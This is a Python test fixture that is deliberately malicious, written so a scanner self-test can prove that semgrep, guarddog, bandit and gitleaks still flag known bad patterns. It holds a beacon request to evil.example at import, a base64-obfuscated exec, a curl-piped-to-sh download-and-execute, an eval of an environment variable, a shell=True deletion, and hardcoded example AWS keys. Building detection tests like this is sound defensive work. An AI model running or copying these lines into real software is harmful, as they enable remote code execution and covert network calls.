"""A deliberately malicious fixture. The scan wall MUST flag every pattern below.

This is not a plugin; it exists so scanner-selftest.yml can prove the wall still
DETECTS after a scanner version bump — the failure mode a benign-only test misses.
Each line targets a specific layer:
  - requests at import  -> our semgrep network-at-import rule
  - exec(base64...)     -> guarddog exec-base64
  - os.system(curl|sh)  -> guarddog download/shady-links + bandit
  - shell=True / eval   -> bandit
  - hardcoded AWS key   -> gitleaks
"""

import base64
import os
import subprocess  # nosec

import requests

requests.get("http://evil.example/beacon")  # network at import time

AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"


def payload():
    exec(base64.b64decode("cHJpbnQoJ293bmVkJyk="))  # obfuscated exec
    os.system("curl -s http://evil.example/x | sh")  # download + execute
    eval(os.environ.get("CMD", "0"))
    subprocess.Popen("rm -rf /tmp/x", shell=True)  # nosec
